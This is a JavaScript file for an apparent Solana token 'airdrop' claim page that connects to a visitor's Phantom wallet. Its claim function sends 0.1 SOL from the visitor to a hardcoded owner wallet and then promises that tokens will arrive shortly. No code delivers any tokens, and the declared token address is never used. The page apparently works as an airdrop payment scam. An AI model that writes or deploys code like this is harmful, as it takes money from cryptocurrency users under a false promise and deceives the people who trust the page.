const AIRDROP_WALLET = "6zkf4DviZZkpWVEh53MrcQV6vGXGpESnNXgAvU6KpBUH";
const OWNER_WALLET = "6zkf4DviZZkpWVEh53MrcQV6vGXGpESnNXgAvU6KpBUH";
const SOL_PAYMENT = 0.1;
const TOKEN_ADDRESS = "8tymgjotRoCnYGA3yzyN8ipRXsq8gnxnGBYkmSYJqD82";

let walletAddress = null;
let provider = null;

async function connectWallet() {
    try {
        if (!window.solana || !window.solana.isPhantom) {
            alert('Please install Phantom wallet!');
            return;
        }

        provider = window.solana;
        const response = await provider.connect();
        walletAddress = response.publicKey.toString();
        document.getElementById('walletAddress').textContent = `Connected: ${walletAddress.slice(0, 4)}...${walletAddress.slice(-4)}`;
        document.getElementById('claimButton').disabled = false;
        document.getElementById('connectWallet').style.display = 'none';
    } catch (err) {
        console.error(err);
        alert('Failed to connect wallet!');
    }
}

async function claimAirdrop() {
    try {
        if (!provider || !walletAddress) {
            alert('Please connect your wallet first!');
            return;
        }

        const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'));
        
        const transaction = new solanaWeb3.Transaction().add(
            solanaWeb3.SystemProgram.transfer({
                fromPubkey: new solanaWeb3.PublicKey(walletAddress),
                toPubkey: new solanaWeb3.PublicKey(AIRDROP_WALLET),
                lamports: solanaWeb3.LAMPORTS_PER_SOL * SOL_PAYMENT
            })
        );

        const { blockhash } = await connection.getRecentBlockhash();
        transaction.recentBlockhash = blockhash;
        transaction.feePayer = new solanaWeb3.PublicKey(walletAddress);

        const signed = await provider.signAndSendTransaction(transaction);
        
        alert('Transaction sent! You will receive your tokens shortly.');
        console.log('Transaction signature:', signed.signature);
    } catch (err) {
        console.error(err);
        alert('Transaction failed! Please try again.');
    }
}

document.getElementById('connectWallet').addEventListener('click', connectWallet);
document.getElementById('claimButton').addEventListener('click', claimAirdrop);
